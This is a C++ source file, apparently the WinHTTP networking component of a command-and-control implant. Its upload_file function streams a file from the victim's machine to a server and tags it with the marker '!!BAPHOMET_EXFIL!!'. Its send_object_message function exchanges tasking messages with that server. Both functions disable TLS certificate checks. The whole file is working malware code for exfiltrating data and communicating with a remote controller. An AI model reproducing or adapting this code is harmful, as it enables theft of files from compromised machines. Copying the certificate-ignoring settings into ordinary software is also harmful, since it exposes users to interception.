//
// Created by diago on 2024-05-24.
//

#include <http.hpp>

bool
networking::http::upload_file(
		_In_ const HINTERNET hConnect,
		_In_ const std::string& object_guid,
		_In_ HANDLE hFile,
		_In_ const std::string& session_token,
		_In_ const bool is_https
	) {

	HINTERNET hRequest	= nullptr;
	LARGE_INTEGER li	= { 0 };

	void*	file_buffer				= nullptr;
	wchar_t raw_path[MAX_PATH + 1]	= { 0 };
	char	file_prefix[19]			= "!!BAPHOMET_EXFIL!!";

	DWORD file_size			= 0;
	DWORD bytes_read		= 0;
	DWORD total_bytes_read	= 0;

	std::wstring auth_hdr;
	std::wstring file_extension;


	auto _ = defer([&]() {
		CLOSE_HANDLE(hFile);
		if (hRequest != nullptr) {
			WinHttpCloseHandle(hRequest);
		}
		if (file_buffer != nullptr) {
			HeapFree(GetProcessHeap(), 0, file_buffer);
		}
	});


	//
	// retrieve file extension for use in request
	//

	if (!GetFinalPathNameByHandleW(
		hFile,
		raw_path,
		MAX_PATH,
		FILE_NAME_NORMALIZED
	)) {
		return false;
	}


	file_extension = raw_path;
	const size_t pos = file_extension.find_last_of(L'.');
	if (pos == std::wstring::npos) {
		return false;
	}

	file_extension = file_extension.substr(pos + 1);


	//
	// open request
	//

	hRequest = WinHttpOpenRequest(
		hConnect,
		L"POST",
		(std::wstring(L"/objects/upload/") + std::wstring(object_guid.begin(), object_guid.end()) + L'/' + file_extension).c_str(),
		nullptr,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		(is_https ? WINHTTP_FLAG_SECURE : 0)
	);

	auth_hdr = L"Authorization: Bearer " + std::wstring(session_token.begin(), session_token.end());
	if (!WinHttpAddRequestHeaders(
		hRequest,
		auth_hdr.c_str(),
		static_cast<DWORD>(auth_hdr.length()),
		WINHTTP_ADDREQ_FLAG_ADD
	)) {
		return false;
	}

	if (is_https) {

		DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
					  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
					  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

		WinHttpSetOption(
			hRequest,
			WINHTTP_OPTION_SECURITY_FLAGS,
			&flags,
			sizeof(DWORD)
		);
	}


	//
	// read file buffer and write it into the request body
	//

	li.QuadPart = 0;
	if (!SetFilePointerEx(
		hFile,
		li,
		nullptr,
		FILE_BEGIN
	)) {
		return false;
	}

	file_size = GetFileSize(hFile, nullptr);
	if (file_size == INVALID_FILE_SIZE) {
		return false;
	}

	file_buffer = HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		4096
	);

	if (file_buffer == nullptr) {
		return false;
	}


	if (!WinHttpSendRequest(
		hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0,
		WINHTTP_NO_REQUEST_DATA,
		0,
		file_size + (sizeof(file_prefix) - 1),
		0
	)) {
		return false;
	}


	//
	// write file prefix to indicate it's a response,
	// then the entire file, 1 page at a time incase the file is large.
	//

	if(!WinHttpWriteData(
		hRequest,
		file_prefix,
		sizeof(file_prefix) - 1,
		nullptr
	)) {
		return false;
	}

	while (ReadFile(
			hFile,
			file_buffer,
			4096,
			&bytes_read,
			nullptr)
				&& bytes_read > 0
				&& total_bytes_read <= file_size
		) {

		total_bytes_read += bytes_read;
		if (!WinHttpWriteData(
			hRequest,
			file_buffer,
			bytes_read,
			nullptr
		)) {
			return false;
		}
	}


	//
	// complete request, ensure response=200
	//

	if(!WinHttpReceiveResponse(hRequest,nullptr)) {
		return false;
	}

	uint32_t status_code = 0;
	uint32_t status_code_size = sizeof(status_code);

	WinHttpQueryHeaders(
		hRequest,
		WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		nullptr,
		&status_code,
		(LPDWORD)&status_code_size,
		nullptr
	);

	if (status_code != 200) {
		return false;
	}


	return true;
}


bool
networking::http::send_object_message(
		_In_ const HINTERNET hConnect,
		_In_ const std::string& object_guid,
		_In_ const std::string& object_message,
		_In_ const std::string& session_token,
		_In_ const bool is_https,
		_Out_ std::string& response_body
	) {

	HINTERNET hRequest = nullptr;
	char* temp_buffer = nullptr;
	const std::wstring auth_hdr = L"Authorization: Bearer " + std::wstring(session_token.begin(), session_token.end());

	auto _ = defer([&]() {
		if (hRequest != nullptr) {
			WinHttpCloseHandle(hRequest);
		}
		if (temp_buffer != nullptr) {
			HeapFree(GetProcessHeap(), 0, temp_buffer);
		}
	});


	hRequest = WinHttpOpenRequest(
		hConnect,
		L"POST",
		( std::wstring(L"/objects/send/") + std::wstring(object_guid.begin(), object_guid.end()) ).c_str(),
		nullptr,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		(is_https ? WINHTTP_FLAG_SECURE : 0)
	);


	if (!WinHttpAddRequestHeaders(
		hRequest,
		auth_hdr.c_str(),
		static_cast<DWORD>(auth_hdr.length()),
		WINHTTP_ADDREQ_FLAG_ADD
	)) {
		return false;
	}


	if (is_https) {

		DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

		WinHttpSetOption(
			hRequest,
			WINHTTP_OPTION_SECURITY_FLAGS,
			&flags,
			sizeof(DWORD)
		);
	}


	if (!WinHttpSendRequest(
		hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0,
		WINHTTP_NO_REQUEST_DATA,
		0,
		object_message.size(),
		0
	)) {
		return false;
	}

	if (!WinHttpWriteData(
		hRequest,
		object_message.data(),
		object_message.size(),
		nullptr
	)) {
		return false;
	}


	if (!WinHttpReceiveResponse(hRequest, nullptr)) {
		return false;
	}


	uint32_t status_code = 0;
	uint32_t code_size = sizeof(status_code);

	if (!WinHttpQueryHeaders(
		hRequest,
		WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		nullptr,
		&status_code,
		(LPDWORD)&code_size,
		nullptr
	) || status_code != 200) {
		return false;
	}


	temp_buffer = static_cast<char*>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		4096
	));

	if (temp_buffer == nullptr) {
		return false;
	}


	DWORD bytes_read = 0;
	while (WinHttpReadData(
		hRequest,
		temp_buffer,
		4096,
		&bytes_read
	) && bytes_read > 0) {
		response_body.insert(response_body.end(), temp_buffer, temp_buffer + bytes_read);
	}

	return true;
}
